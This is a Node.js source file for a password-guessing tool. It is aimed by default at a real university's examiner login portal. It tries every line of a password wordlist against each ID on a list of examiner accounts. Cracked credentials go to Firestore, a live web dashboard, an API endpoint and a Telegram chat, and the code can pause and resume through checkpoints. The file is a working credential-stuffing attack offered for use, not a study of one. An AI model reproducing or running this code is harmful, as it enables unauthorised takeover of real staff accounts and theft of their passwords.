require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const readline = require('readline');

// ==================== FIREBASE INIT ====================
let serviceAccount;
if (process.env.FIREBASE_CREDENTIALS_BASE64) {
  const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
  serviceAccount = JSON.parse(decoded);
} else if (process.env.FIREBASE_CREDENTIALS) {
  serviceAccount = require(process.env.FIREBASE_CREDENTIALS);
} else {
  console.error('❌ Firebase credentials missing');
  process.exit(1);
}
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

// ==================== TELEGRAM (optional) ====================
let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
}

// ==================== CONFIG ====================
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';

let isRunning = false;
let isPaused = false;
let examinerIds = [];
let totalExaminers = 0;
let currentExaminerIndex = 0;
let currentPasswordIndex = 0;        // line number in password file for current examiner
let successes = new Map();            // examinerId -> password
let speedStats = { attempts: 0, startTime: null };

// Single axios instance with keep-alive
const axiosInstance = axios.create({
  timeout: 5000,
  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
});

// ==================== LOAD EXAMINERS ====================
function loadExaminers() {
  const data = fs.readFileSync(EXAMINER_FILE, 'utf8');
  examinerIds = JSON.parse(data);
  totalExaminers = examinerIds.length;
  console.log(`✅ Loaded ${totalExaminers} examiners`);
}

// ==================== PASSWORD STREAM (one by one) ====================
async function* passwordStream(startLine = 0) {
  const fileStream = fs.createReadStream(PASSWORD_FILE);
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
  let lineNo = 0;
  for await (const line of rl) {
    if (lineNo >= startLine) {
      yield line.trim();
    }
    lineNo++;
  }
}

// ==================== LOGIN ATTEMPT (single) ====================
async function tryLogin(examinerId, password) {
  try {
    const res = await axiosInstance.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    });
    speedStats.attempts++;
    return { success: !res.data.includes('Invalid'), password };
  } catch (err) {
    speedStats.attempts++;
    return { success: false };
  }
}

// ==================== PROCESS ONE EXAMINER (sequential passwords) ====================
async function processExaminer(examinerId, startPwdIndex) {
  let foundPassword = null;
  let pwdIndex = startPwdIndex;
  const stream = passwordStream(startPwdIndex);
  
  for await (const password of stream) {
    if (foundPassword) break;
    if (!isRunning || isPaused) break;
    
    const result = await tryLogin(examinerId, password);
    if (result.success) {
      foundPassword = result.password;
      break;
    }
    pwdIndex++;
    currentPasswordIndex = pwdIndex;
    
    // Update progress every 10 passwords to avoid too many events
    if (pwdIndex % 1000 === 0) {
      const elapsed = (Date.now() - speedStats.startTime) / 1000;
      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
      io.emit('progress', {
        examinerIndex: currentExaminerIndex,
        totalExaminers,
        passwordIndex: pwdIndex,
        currentExaminer: examinerId,
        speed
      });
      await saveCheckpoint(); // save after every 10 passwords
    }
  }
  return { found: !!foundPassword, password: foundPassword };
}

// ==================== MAIN ATTACK LOOP ====================
async function startAttack() {
  if (isRunning) return;
  isRunning = true;
  isPaused = false;
  speedStats.attempts = 0;
  speedStats.startTime = Date.now();
  io.emit('status', { running: true, paused: false });
  
  for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
    const examinerId = examinerIds[idx];
    // Skip if already found
    if (successes.has(examinerId)) {
      console.log(`⏭️ Skipping ${examinerId} (already found)`);
      continue;
    }
    currentExaminerIndex = idx;
    let startPwd = (idx === currentExaminerIndex) ? currentPasswordIndex : 0;
    const result = await processExaminer(examinerId, startPwd);
    
    if (result.found) {
      // Save to Firebase
      await db.collection('successful_logins').add({
        examinerId,
        password: result.password,
        timestamp: admin.firestore.FieldValue.serverTimestamp()
      });
      successes.set(examinerId, result.password);
      io.emit('success', { examinerId, password: result.password, time: new Date().toISOString() });
      if (bot) {
        const msg = `✅ *Valid!*\n👤 ${examinerId}\n🔑 ${result.password}`;
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
      }
    }
    // Reset password index for next examiner
    currentPasswordIndex = 0;
    await saveCheckpoint();
  }
  
  isRunning = false;
  await saveCheckpoint();
  io.emit('status', { running: false, paused: false, message: 'Finished' });
}

// ==================== CHECKPOINT (Firestore) ====================
async function saveCheckpoint() {
  const checkpoint = {
    examinerIndex: currentExaminerIndex,
    passwordIndex: currentPasswordIndex,
    successes: Array.from(successes.entries()),
    updatedAt: admin.firestore.FieldValue.serverTimestamp(),
    status: isPaused ? 'paused' : 'running'
  };
  await db.collection('checkpoint').doc('current').set(checkpoint, { merge: true });
}

async function loadCheckpointAndSuccesses() {
  // Load successes from Firebase
  const successSnapshot = await db.collection('successful_logins').get();
  successSnapshot.forEach(doc => {
    const data = doc.data();
    successes.set(data.examinerId, data.password);
  });
  console.log(`📦 Loaded ${successes.size} existing successes`);
  
  // Load checkpoint
  const doc = await db.collection('checkpoint').doc('current').get();
  if (doc.exists) {
    const data = doc.data();
    currentExaminerIndex = data.examinerIndex || 0;
    currentPasswordIndex = data.passwordIndex || 0;
    if (data.successes) {
      for (const [id, pwd] of data.successes) {
        if (!successes.has(id)) successes.set(id, pwd);
      }
    }
    console.log(`📌 Resume from examiner ${currentExaminerIndex}, password line ${currentPasswordIndex}`);
  }
}

// ==================== API & SOCKET.IO ====================
app.get('/api/successes', (req, res) => {
  const list = Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd }));
  res.json({ successes: list, total: successes.size });
});

io.on('connection', (socket) => {
  socket.emit('init', {
    totalExaminers,
    successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
    currentExaminerIndex,
    currentPasswordIndex,
    isRunning,
    isPaused
  });
  
  socket.on('start', () => startAttack());
  socket.on('pause', async () => {
    if (!isRunning) return;
    isPaused = true;
    isRunning = false;
    await saveCheckpoint();
    io.emit('status', { running: false, paused: true });
  });
  socket.on('resume', () => startAttack());
  socket.on('stop', async () => {
    isRunning = false;
    isPaused = false;
    currentExaminerIndex = 0;
    currentPasswordIndex = 0;
    successes.clear();
    await saveCheckpoint();
    io.emit('status', { running: false, paused: false });
    io.emit('init', { totalExaminers, successes: [], currentExaminerIndex: 0, currentPasswordIndex: 0, isRunning: false, isPaused: false });
  });
});

// ==================== START SERVER ====================
loadExaminers();
loadCheckpointAndSuccesses().then(() => {
  server.listen(process.env.PORT || 3000, () => {
    console.log(`✅ Server running at http://localhost:${process.env.PORT || 3000}`);
    console.log(`🛡️ Mode: Safe (one request at a time, streaming passwords)`);
    console.log(`💾 Memory usage: < 50 MB (no password array)`);
  });
});
